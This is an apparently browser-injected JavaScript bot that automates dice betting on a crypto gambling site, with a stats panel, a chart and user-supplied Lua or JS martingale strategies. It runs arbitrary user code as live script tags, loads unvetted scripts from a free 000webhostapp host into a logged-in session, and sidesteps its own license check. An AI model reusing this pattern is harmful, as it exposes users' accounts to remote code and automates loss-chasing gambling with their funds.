if (!localStorage.getItem("license"))
  localStorage.setItem("license", "license");

function dragElement(elm) {
  var pos1 = 0,
    pos2 = 0,
    pos3 = 0,
    pos4 = 0;
  if (document.getElementById(elm.id + "header")) {
    // if present, the header is where you move the DIV from:
    document.getElementById(elm.id + "header").onmousedown = dragMouseDown;
  } else {
    // otherwise, move the DIV from anywhere inside the DIV:
    elm.onmousedown = dragMouseDown;
  }

  if (document.getElementById(elm.id + "header2")) {
    // if present, the header is where you move the DIV from:
    document.getElementById(elm.id + "header2").onmousedown = dragMouseDown;
  } else {
    // otherwise, move the DIV from anywhere inside the DIV:
    elm.onmousedown = dragMouseDown;
  }

  function dragMouseDown(e) {
    e = e || window.event;
    e.preventDefault();
    // get the mouse cursor position at startup:
    pos3 = e.clientX;
    pos4 = e.clientY;
    document.onmouseup = closeDragElement;
    // call a function whenever the cursor moves:
    document.onmousemove = elementDrag;
  }

  function elementDrag(e) {
    e = e || window.event;
    e.preventDefault();
    // calculate the new cursor position:
    pos1 = pos3 - e.clientX;
    pos2 = pos4 - e.clientY;
    pos3 = e.clientX;
    pos4 = e.clientY;
    // set the element's new position:
    elm.style.top = elm.offsetTop - pos2 + "px";
    elm.style.left = elm.offsetLeft - pos1 + "px";
  }

  function closeDragElement() {
    // stop moving when mouse button is released:
    document.onmouseup = null;
    document.onmousemove = null;
  }
}

mode = "lua";
client = "";
show = true;
startTime = new Date();
playTime = 0;
playDays = 0;
playHours = 0;
playMinutes = 0;
playSeconds = 0;
dps = [];
chart = "";
betsChart = 0;
profitChart = 0;
run = true;
win = true;
sOW = false;
coin = "";
nextbet = 0;
chance = 0;
bethigh = true;
bets = 0;
wins = 0;
losses = 0;
balance = 0;
profit = 0;
wagered = 0;
maxBetAmount = 0;
currentprofit = 0;
winstreak = 0;
losestreak = 0;
currentstreak = 0;
maxwinstreak = 0;
maxlosestreak = 0;
previousbet = 0;
lastBet = {
  nonce: 0,
  id: 0,
  amount: 0,
  roll: 0,
  chance: 0,
  profit: 0,
};
tgStats = true;
tgChart = true;
tgCode = true;
tgAdvanced = true;
tgLog = true;
limitTime = "";
token = "";
cname = "";
state = 0;
typeBalance = "";
coins = [];
balances = [];
disChart = false;
base = 0;
multiOnWin = 0;
multiOnLosses = 0;
checkBet = 0;
checkChance = 0;
countBet = 0;
countChance = 0;
afterLossesBet = 0;
afterLossesChance = 0;
countAfterLosses = 0;
bot = `<style>
#mydiv {
  position: absolute;
  z-index: 9999;
}

#mydivheader,
#mydivheader2 {
  padding: 10px;
  cursor: move;
  z-index: 99999;
}

.wdb--container {
  width: 1000px;
  background: #fff;
  color: #000;
  line-height: 150%;
  border-radius: 12px;
}

.wdb--toggle-bot {
  width: 86px;
  height: 86px;
  position: fixed;
  left: 16px;
  top: 16px;
  z-index: 99999;
  cursor: pointer;
  border-radius: 12px;
  box-shadow: 0px 0px 17px 0px #282624;
}

.wdb--button {
  all: revert;
  width: 100%;
}

.wdb--button:disabled  {
  background-color: #ccc;
  border: 1px solid #ccc;
}

.wdb--select {
  all: revert;
}

.wdb--input {
  all: revert;
}

.wdb--advanced {
  overflow-y: auto;
  height: 270px;
  display: none;
}

.wdb--bet-win {
  background-color: #91f190;
}

.wdb--bet-lose {
  background-color: #ffc0cb;
}

.wdb--status {
  width: 100%; 
  border-collapse: collapse; 
  text-align: center;
}

.wdb--status > thead > tr > th,
.wdb--status > tbody > tr > td {
  border: 1px solid #ddd;
  text-align: center;
  font-weight: initial;
}

.wdb--status > thead > tr > th {
  padding: 3px;
  font-weight: initial;
}

.wdb--control {
  width: 100%;
  text-align: center;
}

.wdb--control > tbody > tr > td {
  padding: 3px;
  font-weight: initial;
}

.wdb--history {
  width: 100%;
  text-align: center;
  border-collapse: collapse;
}

.wdb--history > thead > tr > th,
.wdb--history > tbody > tr > td {
  border: 1px solid #ddd;
  text-align: center;
  font-weight: initial;
}

.wdb--history > thead > tr > th {
  padding: 3px;
}

.wdb--advanced-item {
  padding: 3px;
  margin-top: 3px;
  margin-bottom: 3px;
  border-bottom: 1px solid #ddd;
  line-height: 120%;
}

.wdb--pre {
  background: #fff;
  color: #000;
  line-height: 150%;
  padding-top: 6px;
}

.wdb--w-100 {
  width: 100%
}

.wdb--w-40 {
  width: 40%
}

.wdb--w-20 {
  width: 20%
}

.CodeMirror {
  height: 260px;
}

.CodeMirror {
  border: 1px solid #eee;
  height: auto;
  max-height: 240px;
  text-align: left;
}

.CodeMirror-scroll {
  height: auto;
  max-height: 240px;
  text-align: left;
}
</style>

<!--<img src="https://40f2f5bd-2202-429b-b3d9-47edafef461c.000webhostapp.com/logo.png" class="wdb--toggle-bot" onclick="botToggle()" />-->

<div class="wdb--container" id="mydiv">
  <div id="mydivheader">
    click here to move
  </div>

  <audio id="ching" src="https://40f2f5bd-2202-429b-b3d9-47edafef461c.000webhostapp.com/ching.mp3"></audio>

  <div style="overflow-x: auto;">
    <table class="wdb--status">
      <thead>
        <tr>
          <th>status</th>
          <th>run time</th>
          <th>coin</th>
          <th>wagered</th>
          <th>balance</th>
          <th>profit</th>
          <th>max bet</th>
          <th>bets</th>
          <th>wins</th>
          <th>losses</th>
          <th>maxwinstreak</th>
          <th>maxlosestreak</th>
          <th>currentstreak</th>
        </tr>
      </thead>
      <tbody id="jsBotStats">
        <tr>
          <td id="jsBotStatus">connected</td>
          <td id="jsBotRunTime">0:0:0:0</td>
          <td>
            <select id="jsBotCoin" onchange="changeCoin()" class="wdb--select"></select>
          </td>
          <td id="jsBotWagered">0.00000000</td>
          <td id="jsBotBalance">0.00000000</td>
          <td id="jsBotProfit">0.00000000</td>
          <td id="jsBotMaxBetAmount">0.00000000</td>
          <td id="jsBotBets">0</td>
          <td id="jsBotWins">0</td>
          <td id="jsBotLosses">0</td>
          <td id="jsBotMaxwinstreak">0</td>
          <td id="jsBotMaxlosestreak">0</td>
          <td id="jsBotcurrentstreak">0</td>
        </tr>
      </tbody>
    </table>
  </div>

  <div style="display: flex; justify-content: center;">
    <div id="boxChart" style="width: 60%;">
      <div id="jsBotChart" style="height: 260px;"></div>
    </div>

    <div id="boxScript" style="width: 40%; float: right;">
      <div id="wdbScript">

        <div id="divLoadScript">
          <div style="display: flex; justify-content: center;">
            <div style="width: 70%; padding: 3px;">
              <input id="urlScript" type="text" class="wdb--input wdb--w-100" placeholder="link raw script from github">
            </div>
            <div style="width: 30%; padding: 3px; float: right;">
              <button id="loadScriptButton" class="wdb--button">load</button>
            </div>
          </div>
        </div>

        <div id="wdbLuaMode">
<textarea id="jsBotCode">-- example lua code
chance=49.5
bethigh=true
basebet=0.00000001
nextbet=basebet

function dobet()
  if (win) then
    nextbet=basebet
  else
    nextbet=previousbet*2
  end
end
</textarea>
        </div>

        <div id="wdbJsMode">
<textarea id="jsBotCodeJs">// example js code
chance=49.5
bethigh=true
basebet=0.00000001
nextbet=basebet

function dobet() {
  if (win) {
    nextbet=basebet
  } else {
    nextbet=previousbet*2
  }
}
</textarea>
        </div>
      </div>

      <div id="wdbAdvanced">
        <div id="wdbAdvancedMode" class="wdb--advanced">
          <div class="wdb--advanced-item">
            base bet amount
            <input type="number" id="advancedBaseBet" value="0.00000001" class="wdb--input wdb--w-40" />
          </div>

          <div class="wdb--advanced-item">
            chance <input type="number" id="advancedChance" value="49.5" class="wdb--input wdb--w-20" />
          </div>

          <div class="wdb--advanced-item">
            bethigh <span class="custom-switch"><input
              style="all: revert;"
              type="checkbox"
              id="advancedBetHigh"
              checked
            />
            </span>
          </div>

          <div class="wdb--advanced-item">
            multi on lose
            <input type="number" id="advancedMultiOnLossses" value="2" class="wdb--input wdb--w-20" />
          </div>

          <div class="wdb--advanced-item">
            multi on win
            <input type="number" id="advancedMultiOnWin" value="1" class="wdb--input wdb--w-20" />
          </div>

          <div class="wdb--advanced-item">
            multi after
            <input type="number" id="countAfterLosses" value="1" class="wdb--input wdb--w-20" />
            lose
          </div>

          <div class="wdb--advanced-item">
            multi after
            <input type="number" id="countAfterWins" value="1" class="wdb--input wdb--w-20" />
            win
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedAfterLossesBetCheck"
            />
            after
            <input type="number" value="1" id="advancedAfterLossesBetCount" class="wdb--input wdb--w-20" />
            lose
            <br>
            set bet amount to
            <input type="number" id="advancedAfterLossesBet" value="0.00000010" class="wdb--input wdb--w-40" />
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedAfterLossesChanceCheck"
            />
            after
            <input type="number" value="1" id="advancedAfterLossesChanceCount" class="wdb--input wdb--w-20" />
            lose
            <br>
            set chance to
            <input type="number" value="45.5" id="advancedAfterLossesChance" class="wdb--input wdb--w-20" />
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedSideBetsCheck"
            />
            switch bethigh after
            <input type="number" value="1" id="advancedSideBets" class="wdb--input wdb--w-20" />
            bet
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedSideWinsCheck"
            />
            switch bethigh after
            <input type="number" value="1" id="advancedSideWins" class="wdb--input wdb--w-20" />
            win
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedSideLossesCheck"
            />
            switch bethigh after
            <input type="number" value="1" id="advancedSideLosses" class="wdb--input wdb--w-20" />
            lose
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedBetHighOnProfitCheck"
            />
            switch bethigh after profit
            <input type="number" value="0.00000010" id="advancedBetHighOnProfit" class="wdb--input wdb-w-40" />
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedResetStatsProfitCheck"
            />
            resetstats after profit
            <input type="number" value="0.00000010" id="advancedResetStatsProfit" class="wdb--input wdb-w-40" />
          </div>
          
          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterStreakCheck"
            />
            stop after currentstreak
            <input type="number" value="-2" id="advancedStopAfterStreak" class="wdb--input wdb--w-20" />
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterBetsCheck"
            />
            stop after
            <input type="number" value="10" id="advancedStopAfterBets" class="wdb--input wdb--w-20" /> bet
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterWinsCheck"
            />
            stop after
            <input type="number" value="1" id="advancedStopAfterWins" class="wdb--input wdb--w-20" /> win
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterLossesCheck"
            />
            stop after
            <input type="number" value="1" id="advancedStopAfterLosses" class="wdb--input wdb--w-20" /> lose
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterProfitCheck"
            />
            stop after profit
            <input type="number" value="0.00000010" id="advancedStopAfterProfit" class="wdb--input wdb--w-40" />
          </div>

          <div class="wdb--advanced-item">
            <input
              style="all: revert;"
              type="checkbox"
              id="advancedStopAfterBalanceCheck"
            />
            stop after balance
            <input type="number" value="0.00000010" id="advancedStopAfterBalance" class="wdb--input wdb--w-40" />
          </div>
        </div>
      </div>
    </div>
  </div>

  <div style="overflow-x: auto;">
    <table class="wdb--control">
      <tbody>
        <tr>
          <td><button id="jsBotStart" class="wdb--button">start()</button></td>
          <td><button id="jsBotStop" class="wdb--button">stop()</button></td>
          <td><button id="jsBotResetSeed" class="wdb--button">resetseed()</button></td>
          <td><button id="jsBotResetStats" class="wdb--button">resetstats()</button></td>
          <td><button id="jsBotResetChart" class="wdb--button">resetchart()</button></td>
          <td><button id="jsBotToggleCode" class="wdb--button"><span id="stateScript" style="all: revert;">hide</span> script</button></td>
          <td><button id="jsBotToggleAdvanced" class="wdb--button"><span id="stateAdvanced" style="all: revert;">hide</span> advanced</button></td>
          <td><button id="jsBotCheckBalance" class="wdb--button">checkbalance()</button></td>
        </tr>
        <tr>
          <td><button id="jsBotContinue" class="wdb--button">continue()</button></td>
          <td><button id="jsBotStopOnWin" class="wdb--button">stop on win</button></td>
          <td><button id="jsBotResetTime" class="wdb--button">resettime()</button></td>
          <td><button id="jsBotToggleStats" class="wdb--button"><span id="stateStats" style="all: revert;">hide</span> stats</button></td>
          <td><button id="jsBotToggleChart" class="wdb--button"><span id="stateChart" style="all: revert;">hide</span> chart</button></td>
          <td><button id="jsBotToggleHistory" class="wdb--button"><span id="stateHistory" style="all: revert;">hide</span> history</button></td>
          <td><button id="jsBotToggleDisChart" class="wdb--button"><span id="stateDisChart" style="all: revert;">stop</span> chart</button></td>
          <td>
          <select id="jsBotMode" class="wdb--select wdb--w-100">
            <option value="lua">lua mode</option>
            <option value="js">js mode</option>
            <option value="advanced">advanced mode</option>
          </select>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div style="overflow-x: auto;">
    <table class="wdb--history">
      <thead>
        <tr>
          <th>amount</th>
          <th>bethigh</th>
          <th>target</th>
          <th>result</th>
          <th>profit</th>
        </tr>
      </thead>
      <tbody id="jsBotHistory"></tbody>
    </table>
  </div>

  <div id="mydivheader2">
    click here to move
  </div>
</div>`;

function botToggle() {
  if (show) {
    show = false;
    $(".wdb--container").hide();
  } else {
    show = true;
    $(".wdb--container").show();
  }
}

function openTab(evt, target) {
  var i, tcontent, tablinks;
  tcontent = document.getElementsByClassName("tab-content");
  for (i = 0; i < tcontent.length; i++) {
    tcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(target).style.display = "block";
  evt.currentTarget.className += " active";
}

function handleAdvanced() {
  multiOnWin = Number($("#advancedMultiOnWin").val());
  multiOnLosses = Number($("#advancedMultiOnLossses").val());
  chance = Number($("#advancedChance").val());

  checkBet = $("#advancedAfterLossesBetCheck").prop("checked");
  countBet = Number($("#advancedAfterLossesBetCount").val());
  afterLossesBet = Number($("#advancedAfterLossesBet").val());

  checkChance = $("#advancedAfterLossesChanceCheck").prop("checked");
  countChance = Number($("#advancedAfterLossesChanceCount").val());
  afterLossesChance = Number($("#advancedAfterLossesChance").val());

  countAfterWins = Number($("#countAfterWins").val());
  countAfterLosses = Number($("#countAfterLosses").val());

  sideCheckBets = $("#advancedSideBetsCheck").prop("checked");
  sideBets = Number($("#advancedSideBets").val());
  if (sideCheckBets) {
    if (bets % sideBets == 0) bethigh = !bethigh;
  } else bethigh = $("#advancedBetHigh").prop("checked");

  sideCheckWins = $("#advancedSideWinsCheck").prop("checked");
  sideWins = Number($("#advancedSideWins").val());

  sideCheckLosses = $("#advancedSideLossesCheck").prop("checked");
  sideLosses = Number($("#advancedSideLosses").val());

  sideCheckProfit = $("#advancedBetHighOnProfitCheck").prop("checked");
  sideProfit = Number($("#advancedBetHighOnProfit").val());
  if (sideCheckProfit) {
    if (profit >= sideProfit) bethigh = !bethigh;
  } else bethigh = $("#advancedBetHigh").prop("checked");

  stopStreakCheck = $("#advancedStopAfterStreakCheck").prop("checked");
  stopStreak = Number($("#advancedStopAfterStreak").val());
  if (stopStreakCheck) {
    if (stopStreak > 0) {
      if (currentstreak >= stopStreak) return stop();
    } else if (currentstreak <= stopStreak) return stop();
  }

  stopBetsCheck = $("#advancedStopAfterBetsCheck").prop("checked");
  stopBets = Number($("#advancedStopAfterBets").val());
  if (stopBetsCheck) if (bets >= stopBets) return stop();

  stopWinsCheck = $("#advancedStopAfterWinsCheck").prop("checked");
  stopWins = Number($("#advancedStopAfterWins").val());
  if (stopWinsCheck) if (winstreak >= stopWins) return stop();

  stopLossesCheck = $("#advancedStopAfterLossesCheck").prop("checked");
  stopLosses = Number($("#advancedStopAfterLosses").val());
  if (stopLossesCheck) if (losestreak >= stopLosses) return stop();

  stopProfitCheck = $("#advancedStopAfterProfitCheck").prop("checked");
  stopProfit = Number($("#advancedStopAfterProfit").val());
  if (stopProfitCheck) if (profit >= stopProfit) return stop();

  stopBalanceCheck = $("#advancedStopAfterBalanceCheck").prop("checked");
  stopBalance = Number($("#advancedStopAfterBalance").val());
  if (stopBalanceCheck) if (balance >= stopBalance) return stop();

  resetstatsCheckProfit = $("#advancedResetStatsProfitCheck").prop("checked");
  resetstatsProfit = Number($("#advancedResetStatsProfit").val());

  if (resetstatsCheckProfit) if (profit >= resetstatsProfit) resetstats();

  if (win) {
    if (sideCheckWins) {
      if (winstreak % sideWins == 0) bethigh = !bethigh;
    } else bethigh = $("#advancedBetHigh").prop("checked");
    if (winstreak % countAfterWins == 0) nextbet = base * multiOnWin;
  } else {
    if (sideCheckLosses) {
      if (losestreak % sideLosses == 0) bethigh = !bethigh;
    } else bethigh = $("#advancedBetHigh").prop("checked");
    if (losestreak % countAfterLosses == 0)
      nextbet = previousbet * multiOnLosses;

    if (checkBet) {
      if (countBet <= 0)
        return stop(), alert("what number of bet after losses for bet amount");
      if (losestreak == countBet) {
        nextbet = afterLossesBet;
      }
    }
    if (checkChance) {
      if (countChance <= 0)
        return stop(), alert("what number of bet after losses for chance");
      if (losestreak == countChance) {
        chance = afterLossesChance;
      }
    }
  }
}

function ching() {
  var audio = $("#ching")[0];
  audio.play();
}

function toggleStats() {
  if (tgStats) {
    tgStats = false;
    $("#jsBotStats").hide();
    $("#stateStats").text("show");
  } else {
    tgStats = true;
    $("#jsBotStats").show();
    $("#stateStats").text("hide");
  }
}

function toggleChart() {
  if (tgChart) {
    tgChart = false;
    $("#jsBotChart").hide();
    $("#stateChart").text("show");
  } else {
    tgChart = true;
    $("#jsBotChart").show();
    $("#stateChart").text("hide");
  }
}

function toggleCode() {
  if (mode == "advanced") return;
  if (tgCode) {
    tgCode = false;
    $("#boxChart").css("width", "100%");
    $("#wdbScript").hide();
    $("#stateScript").text("show");
  } else {
    tgCode = true;
    $("#boxChart").css("width", "60%");
    $("#wdbScript").show();
    $("#stateScript").text("hide");
  }
}

function toggleAdvanced() {
  if (mode != "advanced") return;
  if (tgAdvanced) {
    tgAdvanced = false;
    $("#wdbAdvanced").hide(), $("#stateAdvanced").text("show");
  } else {
    tgAdvanced = true;
    $("#wdbAdvanced").show();
    $("#stateAdvanced").text("hide");
  }
}

function toggleHistory() {
  if (tgLog) {
    tgLog = false;
    $("#jsBotHistory").hide();
    $("#stateHistory").text("show");
  } else {
    tgLog = true;
    $("#jsBotHistory").show();
    $("#stateHistory").text("hide");
  }
}

function toggleMode(m) {
  mode = m.target.value;

  if (m.target.value == "lua") {
    $("#wdbLuaMode").show();
    $("#wdbJsMode").hide();
    $("#wdbAdvancedMode").hide();
    $("#divLoadScript").show();
  }

  if (m.target.value == "js") {
    $("#wdbLuaMode").hide();
    $("#wdbJsMode").show();
    $("#wdbAdvancedMode").hide();
    $("#divLoadScript").show();
  }

  if (m.target.value == "advanced") {
    $("#wdbLuaMode").hide();
    $("#wdbJsMode").hide();
    $("#wdbAdvancedMode").show();
    $("#divLoadScript").hide();
  }
}

function toggleDisChart() {
  if (disChart) {
    disChart = false;
    $("#stateDisChart").text("stop");
  } else {
    disChart = true;
    $("#stateDisChart").text("start");
  }
}

function countTime() {
  setInterval(() => {
    playTime = new Date().getTime() - startTime;
    playDays = Math.floor(playTime / (1e3 * 6e1 * 6e1 * 24));
    playHours = Math.floor(
      (playTime % (1e3 * 6e1 * 6e1 * 24)) / (1e3 * 6e1 * 6e1)
    );
    playMinutes = Math.floor((playTime % (1e3 * 6e1 * 6e1)) / (1e3 * 6e1));
    playSeconds = Math.floor((playTime % (1e3 * 6e1)) / 1e3);
    $("#jsBotRunTime").html(
      `${playDays}:${playHours}:${playMinutes}:${playSeconds}`
    );
  }, 1e3);
}

function changeCoin() {
  coin = $("#jsBotCoin").val();
  checkbalance();
}

function drawChart() {
  dps = [{ x: betsChart, y: profitChart }];
  chart = new CanvasJS.Chart("jsBotChart", {
    theme: "light1",
    axisY: {
      includeZero: false,
    },
    data: [
      {
        type: "line",
        markerSize: 0,
        dataPoints: dps,
      },
    ],
  });
  chart.render();
}

function updateChart() {
  dps.push({
    x: betsChart,
    y: profitChart,
    color: color,
  });
  if (dps[dps.length - 2]) dps[dps.length - 2].lineColor = color;
  if (dps.length > 5e2) dps.shift();
  chart.render();
}

function handleStats() {
  if (Number(currentprofit) >= 0) {
    win = true;
    color = "green";
    wins++;
    winstreak++;
    losestreak = 0;
    currentstreak = winstreak;
  } else {
    win = false;
    color = "red";
    losses++, losestreak++, (winstreak = 0);
    currentstreak = 0 - losestreak;
  }
  wagered += nextbet;
  if (nextbet > maxBetAmount) maxBetAmount = nextbet;
  if (winstreak > maxwinstreak) maxwinstreak = winstreak;
  if (losestreak > maxlosestreak) maxlosestreak = losestreak;
  updateStats();
}

function bindButton() {
  $("#jsBotStart").click(() => start());
  $("#jsBotStop").click(() => stop());
  $("#jsBotContinue").click(() => continuebet());
  $("#jsBotStopOnWin").click(() => stopOnWin());
  $("#jsBotResetStats").click(() => resetstats());
  $("#jsBotResetChart").click(() => resetChart());
  $("#jsBotResetSeed").click(() => resetseed());
  $("#jsBotToggleStats").click(() => toggleStats());
  $("#jsBotToggleChart").click(() => toggleChart());
  $("#jsBotToggleHistory").click(() => toggleHistory());
  $("#jsBotToggleDisChart").click(() => toggleDisChart());
  $("#jsBotToggleCode").click(() => toggleCode());
  $("#jsBotToggleAdvanced").click(() => toggleAdvanced());
  $("#jsBotMode").change((e) => toggleMode(e));
  $("#jsBotCheckBalance").click(() => checkbalance());
  $("#jsBotResetTime").click(() => resettime());
  $("#loadScriptButton").click(() => loadScript());
}

function updateStats() {
  $("#jsBotWagered").text(`${typeBalance}${Number(wagered).toFixed(8)}`);
  $("#jsBotBalance").text(`${typeBalance}${Number(balance).toFixed(8)}`);
  $("#jsBotProfit").text(`${typeBalance}${Number(profit).toFixed(8)}`);
  $("#jsBotMaxBetAmount").text(
    `${typeBalance}${Number(maxBetAmount).toFixed(8)}`
  );
  $("#jsBotBets").text(`${bets}`);
  $("#jsBotWins").text(`${wins}`);
  $("#jsBotLosses").text(`${losses}`);
  $("#jsBotMaxwinstreak").text(`${maxwinstreak}`);
  $("#jsBotMaxlosestreak").text(`${maxlosestreak}`);
  $("#jsBotcurrentstreak").text(`${currentstreak}`);
}

async function updateHistory(amount, target, result, profit) {
  var hilo = bethigh
    ? `<input
    style="all: revert;"
    type="checkbox"
    checked
    style="all: revert;"
    />`
    : `<input
      style="all: revert;"
      type="checkbox"
      style="all: revert;"
    />`;
  var history = `<tr class="${
    Number(profit) >= 0 ? "wdb--bet-win" : "wdb--bet-lose"
  }">
        <td>${Number(amount).toFixed(8)}</td>
        <td>${hilo}</td>
        <td>${target}</td>
        <td>${result}</td>
        <td>${
          Number(profit) >= 0
            ? "+" + Number(profit).toFixed(8)
            : Number(profit).toFixed(8)
        }</td>
    </tr>`;
  $("#jsBotHistory").prepend(history);
  var maxLine = 20;
  if ($("#jsBotHistory > tr").length > maxLine)
    for (var i = 0; i < $("#jsBotHistory > tr").length - maxLine; i++)
      $("#jsBotHistory > tr:last-child").remove();
  return "OK";
}

function start() {
  $("#jsBotStatus").text("run");
  run = true;
  sOW = false;
  if (mode == "lua") {
    if ($("#jsBotCode").val() == "") return alert("Enter your code");
    code = editorLua.getValue();
    code = code
      .replace(/!=/g, "~=")
      .replace(/!/g, "not ")
      .replace(/([a-zA-Z]*[0-9]*\s*)\+\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1+$2 ")
      .replace(/([a-zA-Z]*[0-9]*\s*)\-\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1-$2 ")
      .replace(/([a-zA-Z]*[0-9]*\s*)\*\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1*$2 ")
      .replace(/([a-zA-Z]*[0-9]*\s*)\/\=(\s*[a-zA-Z]*[0-9]*)/g, "$1=$1/$2 ");
    fengari.load(code)();
  } else if (mode == "js") {
    code = editorJs.getValue();
    $("body").append(`<script id="jsCodeRunning">${code}</script>`);
  } else if (mode == "advanced") {
    base = Number($("#advancedBaseBet").val());
    nextbet = base;
    chance = Number($("#advancedChance").val());
    bethigh = $("#advancedBetHigh").prop("checked");
  }

  $("#jsBotCoin").attr("disabled", true);
  $("#jsBotMode").attr("disabled", true);
  $("#jsBotStart").attr("disabled", true);
  $("#jsBotContinue").attr("disabled", true);

  return playBet();
}

function stop() {
  if (mode == "js") $("#jsCodeRunning").remove();
  $("#jsBotStatus").text("stop");
  $("#jsBotCoin").attr("disabled", false);
  $("#jsBotMode").attr("disabled", false);
  $("#jsBotStart").attr("disabled", false);
  $("#jsBotContinue").attr("disabled", false);
  run = false;
  sOW = false;
}

function continuebet() {
  $("#jsBotStatus").text("continue");
  $("#jsBotCoin").attr("disabled", true);
  $("#jsBotMode").attr("disabled", true);
  $("#jsBotStart").attr("disabled", true);
  $("#jsBotContinue").attr("disabled", true);
  run = true;
  sOW = false;
  playBet();
}

function stopOnWin() {
  sOW = true;
}

function resetstats() {
  lastBet = {
    id: 0,
    amount: 0,
    roll: 0,
    chance: 0,
    profit: 0,
  };
  wagered = 0;
  profit = 0;
  bets = 0;
  wins = 0;
  losses = 0;
  maxwinstreak = 0;
  maxlosestreak = 0;
  currentstreak = 0;
  maxBetAmount = 0;
  updateStats();
}

function resettime() {
  startTime = new Date();
}

function resetChart() {
  betsChart = 0;
  profitChart = 0;
  drawChart();
}

function alarm() {
  // console.log("We not support this function");
}

function tip() {
  // console.log("We not support this function");
}

function sleep(s) {}

function loadLua() {
  fengari.load("function invest(amount)\nreturn amount\nend")();
  fengari.load("function start()\njs.global:start()\nend")();
  fengari.load("function stop()\njs.global:stop()\nend")();
  fengari.load("function continuebet()\njs.global:continuebet()\nend")();
  fengari.load("function resetseed()\njs.global:resetseed()\nend")();
  fengari.load("function resetstats()\njs.global:resetstats()\nend")();
  fengari.load("function ching()\njs.global:ching()\nend")();
  fengari.load("function checkbalance()\njs.global:checkbalance()\nend")();
  fengari.load("function alarm()\njs.global:alarm()\nend")();
  fengari.load("function resettime()\njs.global:resettime()\nend")();
  fengari.load("function tip()\njs.global:tip()\nend")();
  fengari.load(`local clock = os.clock\n
    function sleep(n)\n
        local t0 = clock()
        while clock() - t0 <= n do end
    end`)();
  fengari.load(
    "math.random = function(min, max)\nreturn js.global:randomNumber(min, max)\nend"
  )();
  fengari.load(
    "math.mod = function(num1, num2)\nreturn js.global:modNumber(num1, num2)\nend"
  )();
  fengari.load(
    "table.getn = function(t)\nlocal count = 0\nfor _, __ in pairs(t) do\ncount = count + 1\nend\nreturn count\nend"
  )();
  fengari.load(
    "balance=" +
      balance +
      "\nnextbet=" +
      nextbet +
      "\nbethigh=" +
      bethigh +
      "\nchance=" +
      chance
  )();
}

function sendLua() {
  fengari.load(
    "previousbet=" +
      previousbet +
      "\nwin=" +
      win +
      "\nbalance=" +
      balance +
      "\nprofit=" +
      profit +
      "\ncurrentprofit=" +
      currentprofit
  )();
  fengari.load(
    "bets=" +
      bets +
      "wins=" +
      wins +
      "\nlosses=" +
      losses +
      "\nwinstreak=" +
      winstreak +
      "\nlosestreak=" +
      losestreak +
      "\ncurrentstreak=" +
      currentstreak
  )();
  fengari.load(
    "lastBet={nonce=" +
      lastBet.nonce +
      ",\nid=" +
      lastBet.id +
      ",\nchance=" +
      lastBet.chance +
      ",\nroll=" +
      lastBet.roll +
      ",\namount=" +
      previousbet +
      ",\nprofit=" +
      currentprofit +
      "\n,}"
  )();
  fengari.load("dobet()")();
}

function makeScriptBox() {
  editorJs = CodeMirror.fromTextArea(document.getElementById("jsBotCodeJs"), {
    mode: "javascript",
    lineNumbers: true,
  });
  editorJs.setOption("theme", "abcdef");
  editorJs.save();
  $("#wdbJsMode").hide();

  editorLua = CodeMirror.fromTextArea(document.getElementById("jsBotCode"), {
    mode: "lua",
    lineNumbers: true,
  });
  editorLua.setOption("theme", "abcdef");
  editorLua.save();
}

async function botInstaller() {
  if (!localStorage.getItem("license")) return enterKey();
  $("head").append(
    $('<link rel="stylesheet" type="text/css" />').attr(
      "href",
      "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.3/codemirror.min.css"
    )
  );
  $("head").append(
    $('<link rel="stylesheet" type="text/css" />').attr(
      "href",
      "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/abcdef.min.css"
    )
  );
  await $.getScript(
    "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.3/codemirror.min.js"
  );
  await $.getScript(
    "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.3/mode/javascript/javascript.min.js"
  );
  await $.getScript(
    "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.3/mode/lua/lua.min.js"
  );
  await $.getScript("https://canvasjs.com/assets/script/canvasjs.min.js");
  await $.getScript("https://40f2f5bd-2202-429b-b3d9-47edafef461c.000webhostapp.com/bc.js");
  await $.getScript("https://40f2f5bd-2202-429b-b3d9-47edafef461c.000webhostapp.com/fengari.js");
  addBot();
}

function randomString(length) {
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function randomNumber(min, max) {
  if (!max) return Math.floor(Math.random() * (min - 0 + 1)) + 0;
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function modNumber(num1, num2) {
  return num1 % num2;
}

function getCookie(name) {
  name = name + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(";");
  for (let i = 0; i < ca.length; i++) {
